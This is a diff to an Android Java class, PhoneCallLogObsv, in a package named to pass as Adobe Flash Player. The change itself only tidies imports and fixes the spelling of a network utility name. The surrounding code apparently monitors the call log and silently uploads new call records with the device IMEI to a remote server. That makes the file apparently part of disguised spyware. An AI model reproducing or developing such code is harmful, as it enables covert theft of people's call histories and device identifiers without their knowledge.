@@ -5,19 +5,15 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.pm.PackageManager;
 import android.database.ContentObserver;
 import android.database.Cursor;
-import android.net.Uri;
 import android.os.Handler;
-import android.os.Looper;
 import android.provider.CallLog;
 import android.util.Log;
-import androidx.core.content.ContextCompat;
-import com.adobe.flashplayer.MyLog;
+
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.Public;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 
 
@@ -96,7 +92,7 @@ public class PhoneCallLogObsv extends ContentObserver{
                     jsarray.put(0,jsobj);
 
 
-                    if (NetworkUitls.isNetworkAvailable(mContext)) {
+                    if (NetworkUtils.isNetworkAvailable(mContext)) {
                         UploadData sendmsg = new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_NEWCALLLOG, Public.IMEI);
                         Thread threadsendloc = new Thread(sendmsg);
                         threadsendloc.start();
